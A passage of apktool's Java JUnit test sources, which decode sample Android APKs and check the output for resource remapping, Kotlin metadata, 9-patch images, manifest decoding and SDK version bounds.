        androlibResources.setSdkInfo(sdkInfo);
        assertEquals("31", androlibResources.checkTargetSdkVersionBounds());
    }

    @Test
    public void checkForShortHandSdkTag() {
        AndrolibResources androlibResources = new AndrolibResources();

        Map<String, String> sdkInfo = new LinkedHashMap<>();
        sdkInfo.put("targetSdkVersion", "O");

        androlibResources.setSdkInfo(sdkInfo);
        assertEquals("26", androlibResources.checkTargetSdkVersionBounds());
    }

    @Test
    public void checkForSdkDevelopmentInsaneTestValue() {
        AndrolibResources androlibResources = new AndrolibResources();

        Map<String, String> sdkInfo = new LinkedHashMap<>();
        sdkInfo.put("targetSdkVersion", "T");

        androlibResources.setSdkInfo(sdkInfo);
        assertEquals("10000", androlibResources.checkTargetSdkVersionBounds());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/decode/AndResGuardTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.decode;

import brut.androlib.ApkDecoder;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.directory.ExtFile;
import brut.common.BrutException;
import brut.util.OS;
import java.io.File;
import java.io.IOException;

import org.junit.*;
import static org.junit.Assert.*;

public class AndResGuardTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(AndResGuardTest.class, "decode/issue1170/", sTmpDir);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void checkifAndResDecodeRemapsRFolder() throws BrutException, IOException {
        String apk = "issue1170.apk";

        // decode issue1170.apk
        ApkDecoder apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + apk));
        sTestOrigDir = new ExtFile(sTmpDir + File.separator + apk + ".out");

        apkDecoder.setOutDir(new File(sTmpDir + File.separator + apk + ".out"));
        apkDecoder.decode();

        File aPng =  new File(sTestOrigDir,"res/mipmap-hdpi-v4/a.png");
        assertTrue(aPng.isFile());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/decode/DecodeArrayTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.decode;

import brut.androlib.ApkDecoder;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.androlib.res.data.ResTable;
import brut.androlib.res.data.value.ResArrayValue;
import brut.androlib.res.data.value.ResValue;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;

import static junit.framework.Assert.assertTrue;

public class DecodeArrayTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(MissingVersionManifestTest.class, "decode/issue1994/", sTmpDir);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void decodeStringArray() throws BrutException {
        String apk = "issue1994.apk";
        ApkDecoder apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + apk));

        ResTable resTable = apkDecoder.getResTable();
        ResValue value = resTable.getResSpec(0x7f020001).getDefaultResource().getValue();

        assertTrue("Not a ResArrayValue. Found: " + value.getClass(), value instanceof ResArrayValue);
    }

    @Test
    public void decodeArray() throws BrutException {
        String apk = "issue1994.apk";
        ApkDecoder apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + apk));

        ResTable resTable = apkDecoder.getResTable();
        ResValue value = resTable.getResSpec(0x7f020000).getDefaultResource().getValue();

        assertTrue("Not a ResArrayValue. Found: " + value.getClass(), value instanceof ResArrayValue);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/decode/DecodeKotlinCoroutinesTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.decode;

import brut.androlib.*;
import brut.common.BrutException;
import brut.directory.DirectoryException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

import static org.junit.Assert.assertTrue;

public class DecodeKotlinCoroutinesTest extends BaseTest {
    private static final String apk = "test-kotlin-coroutines.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(DecodeKotlinCoroutinesTest.class, "decode/kotlin-coroutines/", sTmpDir);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }


    @Test
    public void kotlinCoroutinesDecodeTest() throws IOException, AndrolibException, DirectoryException {

        // decode kotlin coroutines
        ApkDecoder apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + apk));
        apkDecoder.setOutDir(new File(sTmpDir + File.separator + apk + ".out"));
        apkDecoder.setForceDelete(true);
        apkDecoder.decode();
        File coroutinesExceptionHandler = new File(sTmpDir + File.separator + apk + ".out" + File.separator + "META-INF" + File.separator + "services", "kotlinx.coroutines.CoroutineExceptionHandler");
        File coroutinenMainDispatcherHandler = new File(sTmpDir + File.separator + apk + ".out" + File.separator + "META-INF" + File.separator + "services", "kotlinx.coroutines.internal.MainDispatcherFactory");

        assert (coroutinesExceptionHandler.exists());
        assert (coroutinenMainDispatcherHandler.exists());
    }

    @Test
    public void kotlinCoroutinesEncodeAfterDecodeTest() throws IOException, BrutException {

        // decode kotlin coroutines
        ApkDecoder apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + apk));
        apkDecoder.setOutDir(new File(sTmpDir + File.separator + apk + ".out"));
        apkDecoder.setForceDelete(true);
        apkDecoder.decode();

        // build kotlin coroutines
        ExtFile testApk = new ExtFile(sTmpDir, apk + ".out");
        new Androlib().build(testApk, null);
        String newApk = apk + ".out" + File.separator + "dist" + File.separator + apk;
        assertTrue(fileExists(newApk));

        // decode kotlin coroutines again
        apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + newApk));
        apkDecoder.setOutDir(new File(sTmpDir + File.separator + apk + ".out.two"));
        apkDecoder.setForceDelete(true);
        apkDecoder.decode();

        Files.readAllBytes(Paths.get(sTmpDir + File.separator + apk + ".out.two" + File.separator + "AndroidManifest.xml"));
        File coroutinesExceptionHandler = new File(sTmpDir + File.separator + apk + ".out.two" + File.separator + "META-INF" + File.separator + "services", "kotlinx.coroutines.CoroutineExceptionHandler");
        File coroutinenMainDispatcherHandler = new File(sTmpDir + File.separator + apk + ".out.two" + File.separator + "META-INF" + File.separator + "services", "kotlinx.coroutines.internal.MainDispatcherFactory");

        assert (coroutinesExceptionHandler.exists());
        assert (coroutinenMainDispatcherHandler.exists());
    }

    private boolean fileExists(String filepath) {
        return Files.exists(Paths.get(sTmpDir.getAbsolutePath() + File.separator + filepath));
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/decode/DecodeKotlinTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.decode;

import brut.androlib.ApkDecoder;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.directory.ExtFile;
import brut.common.BrutException;
import brut.util.OS;
import org.apache.commons.io.FileUtils;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;
import java.io.IOException;

import static org.junit.Assert.assertTrue;

public class DecodeKotlinTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(DecodeKotlinTest.class, "decode/testkotlin/", sTmpDir);

        String apk = "testkotlin.apk";

        // decode testkotlin.apk
        ApkDecoder apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + apk));
        sTestNewDir = new ExtFile(sTmpDir + File.separator + apk + ".out");

        apkDecoder.setOutDir(new File(sTmpDir + File.separator + apk + ".out"));
        apkDecoder.decode();
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void kotlinFolderExistsTest() {
        assertTrue(sTestNewDir.isDirectory());

        File testKotlinFolder = new File(sTestNewDir, "kotlin");
        assertTrue(testKotlinFolder.isDirectory());
    }

    @Test
    public void kotlinDecodeTest() throws IOException {
        File kotlinActivity = new File(sTestNewDir, "smali/org/example/kotlin/mixed/KotlinActivity.smali");

        assertTrue(FileUtils.readFileToString(kotlinActivity).contains("KotlinActivity.kt"));
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/decode/DoubleExtensionUnknownFileTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.decode;

import brut.androlib.Androlib;
import brut.androlib.ApkDecoder;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.androlib.meta.MetaInfo;
import brut.directory.ExtFile;
import brut.common.BrutException;
import brut.util.OS;
import org.apache.commons.lang3.StringUtils;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;
import java.io.IOException;

import static org.junit.Assert.assertTrue;

public class DoubleExtensionUnknownFileTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(DoubleExtensionUnknownFileTest.class, "decode/issue1244/", sTmpDir);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void multipleExtensionUnknownFileTest() throws BrutException, IOException {
        String apk = "issue1244.apk";

        // decode issue1244.apk
        ApkDecoder apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + apk));
        ExtFile decodedApk = new ExtFile(sTmpDir + File.separator + apk + ".out");
        apkDecoder.setOutDir(new File(sTmpDir + File.separator + apk + ".out"));
        apkDecoder.decode();

        MetaInfo metaInfo = new Androlib().readMetaFile(decodedApk);
        for (String string : metaInfo.doNotCompress) {
            if (StringUtils.countMatches(string, ".") > 1) {
                assertTrue(string.equalsIgnoreCase("assets/bin/Data/sharedassets1.assets.split0"));
            }
        }
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/decode/DuplicateDexTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.decode;

import brut.androlib.*;
import brut.androlib.options.BuildOptions;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.junit.*;

import java.io.File;
import java.io.IOException;


public class DuplicateDexTest extends BaseTest {

    @Before
    public void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        sTestOrigDir = new ExtFile(sTmpDir, "duplicatedex-orig");
        sTestNewDir = new ExtFile(sTmpDir, "duplicatedex-new");
        LOGGER.info("Unpacking duplicatedex.apk...");
        TestUtils.copyResourceDir(DuplicateDexTest.class, "decode/duplicatedex", sTestOrigDir);
    }

    @After
    public void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test(expected = AndrolibException.class)
    public void decodeAllSourcesShouldThrowException() throws BrutException, IOException {
        File testApk = new File(sTestOrigDir, "duplicatedex.apk");

        LOGGER.info("Decoding duplicatedex.apk...");
        ApkDecoder apkDecoder = new ApkDecoder(testApk);
        apkDecoder.setOutDir(sTestNewDir);
        apkDecoder.decode();

        LOGGER.info("Building duplicatedex.apk...");
        BuildOptions buildOptions = new BuildOptions();
        new Androlib(buildOptions).build(sTestNewDir, testApk);
    }

    @Test
    public void decodeUsingOnlyMainClassesMode() throws BrutException, IOException {
        File testApk = new File(sTestOrigDir, "duplicatedex.apk");

        LOGGER.info("Decoding duplicatedex.apk...");
        ApkDecoder apkDecoder = new ApkDecoder(testApk);
        apkDecoder.setDecodeSources(ApkDecoder.DECODE_SOURCES_SMALI_ONLY_MAIN_CLASSES);
        apkDecoder.setOutDir(sTestNewDir);
        apkDecoder.decode();

        LOGGER.info("Building duplicatedex.apk...");
        BuildOptions buildOptions = new BuildOptions();
        new Androlib(buildOptions).build(sTestNewDir, testApk);
    }

}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/decode/Empty9PatchTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.decode;

import brut.androlib.ApkDecoder;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;
import java.io.IOException;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertTrue;

public class Empty9PatchTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(Empty9PatchTest.class, "decode/empty9patch/", sTmpDir);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void decodeWithEmpty9PatchFile() throws BrutException, IOException {
        String apk = "empty9patch.apk";

        // decode empty9patch.apk
        ApkDecoder apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + apk));
        sTestOrigDir = new ExtFile(sTmpDir + File.separator + apk + ".out");

        apkDecoder.setOutDir(new File(sTmpDir + File.separator + apk + ".out"));
        apkDecoder.decode();

        File aPng =  new File(sTestOrigDir,"res/drawable-xhdpi/empty.9.png");
        assertTrue(aPng.isFile());
        assertEquals(0, aPng.length());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/decode/ExternalEntityTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.decode;

import brut.androlib.Androlib;
import brut.androlib.ApkDecoder;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.directory.ExtFile;
import brut.common.BrutException;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

import static org.junit.Assert.assertEquals;

public class ExternalEntityTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        sTestOrigDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(ExternalEntityTest.class, "decode/doctype/", sTestOrigDir);

        LOGGER.info("Building doctype.apk...");
        File testApk = new File(sTestOrigDir, "doctype.apk");
        new Androlib().build(sTestOrigDir, testApk);

        LOGGER.info("Decoding doctype.apk...");
        ApkDecoder apkDecoder = new ApkDecoder(testApk);
        apkDecoder.setOutDir(new File(sTestOrigDir + File.separator + "output"));
        apkDecoder.decode();
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTestOrigDir);
    }

    @Test
    public void doctypeTest() throws IOException {

        String expected = TestUtils.replaceNewlines("<?xml version=\"1.0\" encoding=\"utf-8\"?>" +
                "<manifest android:versionCode=\"1\" android:versionName=\"1.0\" android:compileSdkVersion=\"23\" android:compileSdkVersionCodename=\"6.0-2438415\" " +
                "hardwareAccelerated=\"true\" package=\"com.ibotpeaches.doctype\" platformBuildVersionCode=\"24\" platformBuildVersionName=\"6.0-2456767\"  " +
                "xmlns:android=\"http://schemas.android.com/apk/res/android\">    <supports-screens android:anyDensity=\"true\" android:smallScreens=\"true\" " +
                "android:normalScreens=\"true\" android:largeScreens=\"true\" android:resizeable=\"true\" android:xlargeScreens=\"true\" /></manifest>");

        byte[] encoded = Files.readAllBytes(Paths.get(sTestOrigDir + File.separator + "output" + File.separator + "AndroidManifest.xml"));
        String obtained = TestUtils.replaceNewlines(new String(encoded));
        assertEquals(expected, obtained);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/decode/ForceManifestDecodeNoResourcesTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.decode;

import brut.androlib.ApkDecoder;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;
import java.io.IOException;
import java.util.Arrays;

import static org.junit.Assert.*;

public class ForceManifestDecodeNoResourcesTest extends BaseTest {

    private final byte[] xmlHeader = new byte[] {
            0x3C, // <
            0x3F, // ?
            0x78, // x
            0x6D, // m
            0x6C, // l
            0x20, // (empty)
    };

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(ForceManifestDecodeNoResourcesTest.class, "decode/issue1680/", sTmpDir);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void checkIfForceManifestWithNoResourcesWorks() throws BrutException, IOException {
        String apk = "issue1680.apk";
        String output = sTmpDir + File.separator + apk + ".out";

        // decode issue1680.apk
        decodeFile(sTmpDir + File.separator + apk, ApkDecoder.DECODE_RESOURCES_NONE,
                ApkDecoder.FORCE_DECODE_MANIFEST_FULL, output);

        // lets probe filetype of manifest, we should detect XML
        File manifestFile = new File(output + File.separator + "AndroidManifest.xml");
        byte[] magic = TestUtils.readHeaderOfFile(manifestFile, 6);
        assertArrayEquals(this.xmlHeader, magic);

        // confirm resources.arsc still exists, as its raw
        File resourcesArsc = new File(output + File.separator + "resources.arsc");
        assertTrue(resourcesArsc.isFile());
    }

    @Test
    public void checkIfForceManifestWorksWithNoChangeToResources() throws BrutException, IOException {
        String apk = "issue1680.apk";
        String output = sTmpDir + File.separator + apk + ".out";

        // decode issue1680.apk
        decodeFile(sTmpDir + File.separator + apk, ApkDecoder.DECODE_RESOURCES_FULL,
                ApkDecoder.FORCE_DECODE_MANIFEST_FULL, output);

        // lets probe filetype of manifest, we should detect XML
        File manifestFile = new File(output + File.separator + "AndroidManifest.xml");
        byte[] magic = TestUtils.readHeaderOfFile(manifestFile, 6);
        assertArrayEquals(this.xmlHeader, magic);

        // confirm resources.arsc does not exist
        File resourcesArsc = new File(output + File.separator + "resources.arsc");
        assertFalse(resourcesArsc.isFile());
    }

    @Test
    public void checkForceManifestToFalseWithResourcesEnabledIsIgnored() throws BrutException, IOException {
        String apk = "issue1680.apk";
        String output = sTmpDir + File.separator + apk + ".out";

        // decode issue1680.apk
        decodeFile(sTmpDir + File.separator + apk, ApkDecoder.DECODE_RESOURCES_FULL,
                ApkDecoder.FORCE_DECODE_MANIFEST_NONE, output);

        // lets probe filetype of manifest, we should detect XML
        File manifestFile = new File(output + File.separator + "AndroidManifest.xml");
        byte[] magic = TestUtils.readHeaderOfFile(manifestFile, 6);
        assertArrayEquals(this.xmlHeader, magic);

        // confirm resources.arsc does not exist
        File resourcesArsc = new File(output + File.separator + "resources.arsc");
        assertFalse(resourcesArsc.isFile());
    }

    @Test
    public void checkBothManifestAndResourcesSetToNone() throws BrutException, IOException {
        String apk = "issue1680.apk";
        String output = sTmpDir + File.separator + apk + ".out";

        // decode issue1680.apk
        decodeFile(sTmpDir + File.separator + apk, ApkDecoder.DECODE_RESOURCES_NONE,
                ApkDecoder.FORCE_DECODE_MANIFEST_NONE, output);

        // lets probe filetype of manifest, we should not detect XML
        File manifestFile = new File(output + File.separator + "AndroidManifest.xml");
        byte[] magic = TestUtils.readHeaderOfFile(manifestFile, 6);
        assertFalse(Arrays.equals(this.xmlHeader, magic));

        // confirm resources.arsc exists
        File resourcesArsc = new File(output + File.separator + "resources.arsc");
        assertTrue(resourcesArsc.isFile());
    }

    private void decodeFile(String apk, short decodeResources, short decodeManifest, String output)
            throws BrutException, IOException {
        ApkDecoder apkDecoder = new ApkDecoder(new File(apk));
        apkDecoder.setDecodeResources(decodeResources);
        apkDecoder.setForceDecodeManifest(decodeManifest);
        apkDecoder.setForceDelete(true); // delete directory due to multiple tests.

        apkDecoder.setOutDir(new File(output));
        apkDecoder.decode();
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/decode/MinifiedArscTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.decode;

import brut.androlib.ApkDecoder;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.directory.ExtFile;
import brut.common.BrutException;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

import static org.junit.Assert.assertEquals;

public class MinifiedArscTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(MinifiedArscTest.class, "decode/issue1157/", sTmpDir);

        String apk = "issue1157.apk";
        sTestNewDir = new ExtFile(sTmpDir, "issue1157");

        // decode issue1157.apk
        ApkDecoder apkDecoder = new ApkDecoder(new ExtFile(sTmpDir, apk));
        apkDecoder.setForceDelete(true);
        apkDecoder.setOutDir(sTestNewDir);

        // this should not raise an exception:
        apkDecoder.decode();
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void checkIfMinifiedArscLayoutFileMatchesTest() throws IOException {
        String expected = TestUtils.replaceNewlines("<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
                "<LinearLayout n1:orientation=\"vertical\" n1:layout_width=\"fill_parent\" n1:layout_height=\"fill_parent\"\n" +
                "  xmlns:n1=\"http://schemas.android.com/apk/res/android\">\n" +
                "    <com.ibotpeaches.issue1157.MyCustomView n1:max=\"100\" n2:default_value=\"1.0\" n2:max_value=\"5.0\" n2:min_value=\"0.2\" xmlns:n2=\"http://schemas.android.com/apk/res-auto\" />\n" +
                "</LinearLayout>");

        byte[] encoded = Files.readAllBytes(Paths.get(sTestNewDir + File.separator + "res" + File.separator + "xml" + File.separator + "custom.xml"));
        String obtained = TestUtils.replaceNewlines(new String(encoded));
        assertEquals(expected, obtained);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/decode/MissingDiv9PatchTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.decode;

import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.androlib.res.decoder.Res9patchStreamDecoder;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.*;

import static org.junit.Assert.*;

public class MissingDiv9PatchTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(MissingDiv9PatchTest.class, "decode/issue1522/", sTmpDir);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void assertMissingDivAdded() throws Exception {
        InputStream inputStream = getFileInputStream();
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

        Res9patchStreamDecoder decoder = new Res9patchStreamDecoder();
        decoder.decode(inputStream, outputStream);

        BufferedImage image = ImageIO.read(new ByteArrayInputStream(outputStream.toByteArray()));
        int height = image.getHeight() - 1;

        // First and last pixel will be invisible, so lets check the first column and ensure its all black
        for (int y = 1; y < height; y++) {
            assertEquals("y coordinate failed at: " + y, NP_COLOR, image.getRGB(0, y));
        }

    }

    private FileInputStream getFileInputStream() throws IOException {
